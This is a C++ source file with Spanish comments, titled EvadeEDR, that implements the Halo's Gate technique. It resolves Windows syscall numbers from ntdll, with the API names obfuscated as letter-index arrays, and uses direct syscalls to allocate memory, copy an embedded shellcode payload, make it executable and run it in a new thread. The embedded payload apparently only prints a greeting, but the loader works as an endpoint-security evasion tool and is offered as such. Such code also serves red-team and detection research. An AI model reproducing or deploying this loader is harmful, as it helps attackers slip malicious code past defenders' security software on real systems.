// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#define PATH_DLL "C:\\Windows\\System32\\ntdll.dll"

/*
* 
* Ahora introduciremos el halo's gate
* 
*/

extern "C" {

    EXTERN_C PVOID getntdll();

    EXTERN_C PVOID getExportTable(
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExAddressTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExNamePointerTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExOrdinalTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getApiAddr(
        IN DWORD apiNameStringLen,
        IN LPSTR apiNameString,
        IN PVOID moduleAddr,
        IN PVOID ExExAddressTable,
        IN PVOID ExNamePointerTable,
        IN PVOID ExOrdinalTable
    );

    EXTERN_C DWORD findSyscallNumber(
        IN PVOID ntdllApiAddr
    );

    EXTERN_C DWORD halosGate(
        IN PVOID ntdllApiAddr,
        IN WORD index
    );

    EXTERN_C DWORD compExplorer(
        IN PVOID explorerWString
    );


    EXTERN_C WORD halosGateUp(PVOID addr, DWORD index);

    EXTERN_C WORD halosGateDown(PVOID addr, DWORD index);

    EXTERN_C VOID SetCall(WORD CallValue);
    EXTERN_C NTSTATUS CallFunc(...);
}
// =====================================================

typedef struct _funStruct {
    PBYTE name;
    SIZE_T size;
    WORD sysnum;
}funStruct, *pfunStruct;

// =====================================================
#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)


#define LOG_OK(fmt, ...)\
    print("[+] " fmt, ##__VA_ARGS__)

#define LOG_ERROR(fmt, ...)\
    print("[-] " fmt, ##__VA_ARGS__)

#define LOG_WARNING(fmt, ...)\
    print("[!] " fmt, ##__VA_ARGS__)

#define LOG_INFO(fmt, ...)\
    print("[.] " fmt, ##__VA_ARGS__)

// ======================================================

PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}


PVOID ntdllAddr = NULL;

PVOID ntdllExportTable = NULL;

PVOID ntdllExAddrTbl = NULL;

PVOID ntdllExNamePtrTbl = NULL;

PVOID ntdllExOrdinalTbl = NULL;


char letters[] = {
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
};

BYTE nAllocMem[] = {
    39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};


BYTE nProtectMem[] = {
    39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};

BYTE nCreateTh[] = {
    39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23
};
BYTE nWaitObj[] = {
    39, 19, 48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19
};

BYTE nFreeMem[] = {
    39, 19, 31, 17, 4, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};

BOOL init_program()
{

    ntdllAddr = getntdll();

    if (!ntdllAddr)
    {
        LOG_ERROR("Direccion no encontrada ntdllAddr");
        return FALSE;
    }

    ntdllExportTable = getExportTable(ntdllAddr);

    if (!ntdllExportTable)
    {
        LOG_ERROR("Direccion no encontrada ntdllExportTable");
        return FALSE;
    }

    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExAddrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExAddrTbl");
        return FALSE;
    }

    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExNamePtrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExNamePtrTbl");
        return FALSE;
    }

    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdllAddr);


    if (!ntdllExOrdinalTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExOrdinalTbl");
        return FALSE;
    }

    return TRUE;
}

BOOL get_numSys(pfunStruct structFunction)
{
    if (!ntdllAddr || !ntdllExAddrTbl || !ntdllExNamePtrTbl || !ntdllExOrdinalTbl || !structFunction->name)
    {
        return FALSE;
    }

    size_t strSize = structFunction->size;

    if (strSize > 127)
    {
        LOG_ERROR("El tamano del nombre de la funcion es demasiado grande");
        return FALSE;
    }

    char fn[127] = { 0 };

    for (size_t i = 0; i < strSize; i++)
    {
        fn[i] = letters[structFunction->name[i]];
    }

    LOG_INFO("Funcion a buscar: %s", fn);

    PVOID addr = getApiAddr(
        strSize,
        fn,
        ntdllAddr,
        ntdllExAddrTbl,
        ntdllExNamePtrTbl,
        ntdllExOrdinalTbl
    );


    WORD number = findSyscallNumber(addr);

    if (number)
    {
        LOG_OK("Valor de numerico de %s es %d", fn, number);
        structFunction->sysnum = number;
        return TRUE;
    }

    DWORD index = 0;

    while (number == 0) {
        index++;

        number = halosGateUp(addr, index);

        if (number) {
            number = number - index;
            break;
        }

        number = halosGateDown(addr, index);

        if (number) {
            number = number + index;
            break;
        }
    }

    LOG_OK("Valor de numerico de %s es %d", fn, number);
    structFunction->sysnum = number;

    return TRUE;
}

// Entry Point
int main()
{
    
    LOG_INFO("Comenzando Halo's Gate...");


    // For NtAllocateVirtualMemory
    funStruct sAllocMem;
    sAllocMem.name = nAllocMem;
    sAllocMem.size = sizeof(nAllocMem);


    // For NtProtectVirtualMemory
    funStruct sProtectMem;
    sProtectMem.name = nProtectMem;
    sProtectMem.size = sizeof(nProtectMem);


    // NtCreateThreadEx
    funStruct sCreateTh;
    sCreateTh.name = nCreateTh;
    sCreateTh.size = sizeof(nCreateTh);


    // NtWaitForSingleObject
    funStruct sWaitForObj;
    sWaitForObj.name = nWaitObj;
    sWaitForObj.size = sizeof(nWaitObj);

    // NtFreeVirtualMemory
    funStruct sFreeMem;
    sFreeMem.name = nFreeMem;
    sFreeMem.size = sizeof(nFreeMem);

    if (!init_program()) return -1;

    if (!get_numSys(&sAllocMem)) {
        return -1;
    }
    
    if (!get_numSys(&sProtectMem)) {
        return -1;
    }

    if (!get_numSys(&sCreateTh)) {
        return -1;
    }

    if (!get_numSys(&sWaitForObj)) {
        return -1;
    }

    if (!get_numSys(&sFreeMem)) {
        return -1;
    }

    // Start the process
    BYTE payload[] = {
        0xe9, 0x00, 0x00, 0x00, 0x00, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xec,
        0x28, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b,
        0x40, 0x60, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x10, 0x48, 0x8b,
        0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x30, 0x48, 0x89, 0x05, 0xfd,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xdb, 0x00, 0x00, 0x00,
        0x48, 0x63, 0x48, 0x3c, 0x8b, 0x8c, 0x08, 0x88, 0x00, 0x00, 0x00, 0x8b,
        0x54, 0x08, 0x18, 0x44, 0x8b, 0x44, 0x08, 0x20, 0x49, 0x01, 0xc0, 0x4c,
        0x8d, 0x48, 0xff, 0x83, 0xea, 0x01, 0x0f, 0x82, 0xac, 0x00, 0x00, 0x00,
        0x41, 0x89, 0xd2, 0x43, 0x8b, 0x3c, 0x90, 0x4c, 0x8d, 0x1c, 0x38, 0x4c,
        0x01, 0xcf, 0x31, 0xdb, 0x48, 0x89, 0xde, 0x80, 0x7f, 0x01, 0x00, 0x48,
        0x8d, 0x7f, 0x01, 0x48, 0x8d, 0x5b, 0xff, 0x75, 0xef, 0x4c, 0x39, 0xdf,
        0x74, 0xd1, 0xbf, 0xc5, 0x9d, 0x1c, 0x81, 0x41, 0x0f, 0xb6, 0x1b, 0x49,
        0xff, 0xc3, 0x8d, 0x6b, 0xe0, 0x80, 0xfb, 0x61, 0x40, 0x0f, 0xb6, 0xed,
        0x0f, 0x42, 0xeb, 0x40, 0x0f, 0xb6, 0xdd, 0x31, 0xfb, 0x69, 0xfb, 0x93,
        0x01, 0x00, 0x01, 0x48, 0xff, 0xc6, 0x75, 0xdb, 0x81, 0xff, 0xcc, 0x62,
        0xb0, 0x19, 0x75, 0x9f, 0x8b, 0x54, 0x08, 0x1c, 0x8b, 0x4c, 0x08, 0x24,
        0x48, 0x01, 0xc2, 0x48, 0x01, 0xc1, 0x42, 0x0f, 0xb7, 0x0c, 0x51, 0x44,
        0x8b, 0x14, 0x8a, 0x49, 0x01, 0xc2, 0x4c, 0x89, 0x15, 0x5f, 0x00, 0x00,
        0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b,
        0x40, 0x60, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x48, 0x28, 0x48, 0xc7,
        0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x22, 0x00,
        0x00, 0x00, 0x41, 0xb8, 0x0e, 0x00, 0x00, 0x00, 0x45, 0x31, 0xc9, 0x41,
        0xff, 0xd2, 0xeb, 0x0b, 0x48, 0xc7, 0x05, 0x21, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5d, 0x5f, 0x5e, 0xc3,
        0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64,
        0x21, 0x0a, 0x00
    };

    PVOID pAddr = NULL;
    SIZE_T payload_size = sizeof(payload);
    SIZE_T real_size = payload_size;
    ULONG ulOldProtect = 0;

    NTSTATUS status = 0;

    SetCall(sAllocMem.sysnum);
    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0)
    {
        LOG_ERROR("Error en NtAllocateVirtualMemory : 0x % 08X", status);
        return -1;
    }

    LOG_OK("Memoria asignada en : 0x % p", pAddr);
    LOG_OK("Size: %zu bytes", real_size);

    // Copy payload
    LOG_INFO("Copiando payload...");
    CopyMem(pAddr, (PVOID)payload, real_size);
    LOG_OK("Payload copiado");

    // Change permissions
    LOG_INFO("Cambiando permisos a RX...");
    SetCall(sProtectMem.sysnum);
    status = CallFunc((HANDLE)-1, &pAddr, &real_size, PAGE_EXECUTE_READWRITE, &ulOldProtect);

    if (status != 0)
    {
        LOG_ERROR("Error cambiando permisos: 0x%08X", status);
        return -1;
    }

    LOG_OK("Permisos cambiados exitosamente");



    // CORRECCIÓN: Crear hilo remoto correctamente
    HANDLE hHostThread = NULL;
    DWORD dwThreadId = 0;

    LOG_INFO("Creando hilo remoto...");

    SetCall(sCreateTh.sysnum);

    // NtCreateThreadEx tiene 11 parámetros
    // NTSTATUS NtCreateThreadEx(
    //   PHANDLE ThreadHandle,
    //   ACCESS_MASK DesiredAccess,
    //   POBJECT_ATTRIBUTES ObjectAttributes,
    //   HANDLE ProcessHandle,
    //   LPTHREAD_START_ROUTINE lpStartAddress,
    //   LPVOID lpParameter,
    //   ULONG CreateFlags,
    //   SIZE_T ZeroBits,
    //   SIZE_T StackSize,
    //   SIZE_T MaximumStackSize,
    //   PPS_ATTRIBUTE_LIST AttributeList
    // );

    status = CallFunc(&hHostThread,
        THREAD_ALL_ACCESS,
        NULL,
        (HANDLE)-1,  // Current process
        pAddr,       // Start routine
        NULL,        // Parameter
        FALSE,       // Create suspended?
        0,           // Zero bits
        0,           // Stack size
        0,           // Max stack size
        NULL);       // Attribute list

    if (status != 0) {
        print("[-] Error en NtCreateThreadEx: 0x%08X", status);
        return -1;
    }

    print("[+] Hilo creado (handle: 0x%p)", hHostThread);

    // Wait for thread completion
    print("[*] Esperando a que termine el hilo...");
    SetCall(sWaitForObj.sysnum);
    LARGE_INTEGER timeout;
    timeout.QuadPart = -10000000;  // 1 segundo

    status = CallFunc(hHostThread, FALSE, &timeout);

    if (status == 0x102) {  // STATUS_TIMEOUT
        print("[!] Timeout - el hilo sigue ejecutandose");
    }
    else if (status != 0) {
        print("[-] Error en NtWaitForSingleObject: 0x%08X", status);
    }
    else {
        print("[+] Hilo terminado exitosamente");
    }

    CloseHandle(hHostThread);

    print("[*] Liberando memoria...");
    SetCall(sFreeMem.sysnum);
    SIZE_T free_size = 0;
    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);

    if (status != 0) {
        print("[-] Error liberando memoria: 0x%08X", status);
    }
    else {
        print("[+] Memoria liberada exitosamente");
    }

    print("[+] Programa finalizado");

    return 0;

}